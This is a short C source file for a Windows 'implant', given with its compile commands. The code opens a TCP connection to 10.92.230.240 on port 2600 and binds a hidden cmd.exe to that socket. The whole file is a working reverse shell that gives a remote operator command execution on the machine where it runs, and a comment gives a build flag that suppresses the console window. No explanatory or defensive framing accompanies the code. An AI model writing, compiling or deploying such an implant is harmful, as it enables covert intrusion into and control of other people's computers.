#include "implant.h"
// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o implant.exe -lws2_32
// futiv command : x86_64-w64-mingw32-gcc Implant.c -o implant.exe -lws2_32 -mwindows
int main(){
// Set variables
    char rcvbuffer[DEFAULT_BUFLEN];
    char sndbuffer[DEFAULT_BUFLEN];
    char command[] = "cmd.exe";
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET soc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    SOCKADDR_IN server;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    //clean the struct sinfo & pinfo
    memset(&sinfo, 0, sizeof(sinfo));
    memset(&pinfo, 0, sizeof(pinfo));

    // Assign the count of binary of the struct size
    sinfo.cb = sizeof(sinfo);



    sinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = (HANDLE)soc;
    sinfo.hStdOutput = (HANDLE)soc;
    sinfo.hStdError = (HANDLE)soc;

    // set server's variables
    server.sin_family = AF_INET;
    server.sin_port = htons(2600);
    server.sin_addr.s_addr = inet_addr("10.92.230.240");

    // Check the connexion
    if (connect(soc, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] connexion error\n");
        return 1;
    }
    printf("[+] connected !\n");

    
    if (!CreateProcessA(
        NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo
    )) {
        // print error
        printf("[!] error CreateProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] CMD.exe successfully ran. waiting...\n");


    WaitForSingleObject(pinfo.hProcess, INFINITE);
    // cleanup
    closesocket(soc);
    WSACleanup();
    














    
// cleanup
    closesocket(soc);
    WSACleanup();

    return 0;
}
